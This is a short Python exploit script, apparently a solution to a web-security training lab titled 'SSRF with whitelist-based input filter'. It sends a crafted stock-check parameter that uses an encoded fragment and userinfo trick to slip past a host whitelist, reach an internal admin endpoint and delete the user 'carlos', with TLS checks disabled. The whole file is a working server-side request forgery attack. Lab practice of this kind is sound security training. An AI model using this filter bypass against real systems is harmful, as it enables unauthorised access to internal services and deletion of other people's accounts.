#!/bin/env python3
import requests
import sys
import urllib3
from urllib.parse import urlparse
from colorama import init

init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36'}

def delete_user(s, url):
    check_stock = '/product/stock'
    del_user_payload = 'http://127.1%23@stock.weliketoshop.net/admin/delete?username=carlos'
    params = {'stockApi': del_user_payload}
    req = s.post(url + check_stock, data=params, headers=header, verify=False, allow_redirects=False, proxies=proxies)

    if(req.status_code == 504 or req.status_code != 302 ):
        print("\033[36m[-] Response: [Server Error: Gateway Timeout]")
        print("\033[1;31;40m[-] The lab url is invalid, please get it again.")
        sys.exit(-1)

    admin_panel = 'http://127.1%23@stock.weliketoshop.net/admin'
    params2 = {'stockApi': admin_panel}
    req2 = s.post(url + check_stock, data=params2, headers=header, verify=False, proxies=proxies)

    if(req2.status_code == 200 and 'User deleted successfully!' in req2.text):
        print("\033[1;32;40m[+] Successfully deleted carlos user.")
    else:
        print("\033[1;31;40m[-] Exploit was unsuccessful")


def main():
	if len(sys.argv) != 2:
		print("\033[36m[+] Usage: {0} <url>".format(sys.argv[0]))
		print("\033[36m[+] Example: {0} https://www.bing.com".format(sys.argv[0]))
		sys.exit(-1)

	o = urlparse(sys.argv[1])
	url = o.scheme + "://" + o.hostname
	
	print("\033[36m[+] SSRF with whitelist-based input filter deleting carlos user...")

	s = requests.Session()
	delete_user(s, url)

if __name__ == "__main__":
	main()
